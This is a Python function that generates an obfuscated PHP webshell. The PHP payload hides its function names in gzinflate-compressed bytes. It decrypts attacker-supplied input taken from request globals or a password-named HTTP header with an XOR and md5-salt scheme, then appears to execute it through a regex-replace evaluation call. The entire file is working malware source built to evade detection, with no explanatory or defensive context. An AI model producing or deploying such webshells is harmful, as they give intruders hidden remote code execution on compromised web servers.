def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
    return """<?php
function dept($data,$salt="%s",$change=0x80){
    $data = base64_decode($data);
     $that="";
    $saltm = md5($salt);
    for($i=0;$i<strlen($data);$i++){
            $that.=chr((ord($data[$i])^ord($saltm[$i%%32]))^$change);
        }
    $pass=strrev(str_rot13(substr(strrev($that),0,-32)));

    return $pass;
}

class replace {
    private $hash = "\\xab\\xa8\\xa9\\x00\\xc2\\x78\\x77\\xd7\\x90\\x9a\\x00\\xff\\xe0\\x90\\x1a\\x67\\x7f\\x7f\\x6f\\x4f\\xd7\\x1a\\x95\\xbc\\xc4\\xdc\\x54\\x5b\\x95\\xf8\\x60\\xd7\\xa0\\x30\\xd7\\xa0\\x68\\x00\\x8b\\x07\\x00";
    function __construct($var, $srcname, $array = null)
    {
        $this->var = $var;
        $this->name = $srcname;
        $this->cookie = get_class($this);
        if(!is_null($array))
            die((string)new replace($this->var,array($array,$this->name)));
    }
    function __toString(){
        $die = $this->var .= gzinflate(substr($this->hash,-3)).$this->cookie;
        $this->cookie = explode("|",gzinflate(substr($this->hash,0,-3)));
        if(end($this->name) != 6){
            $name = $this->name[0][$this->cookie[end($this->name)]][%s];
        }else{
            $name = $this->cookie[end($this->name)].'HTTP_%s]';
            $die('.*', '\\0',$name,gzinflate("\\xcb\\x4d\\x2d\\x02\\x00"))=="";
        }
        die($die('.*', '\\0',dept($name),gzinflate("\\xcb\\x4d\\x2d\\x02\\x00")));
    }
}
new replace(gzinflate("\\xcb\\x4d\\x4a\\x2d\\x4a\\x4d\\x07\\x00"), %s,$GLOBALS);""" % (salt, passwd, passwd.upper(), keyword)
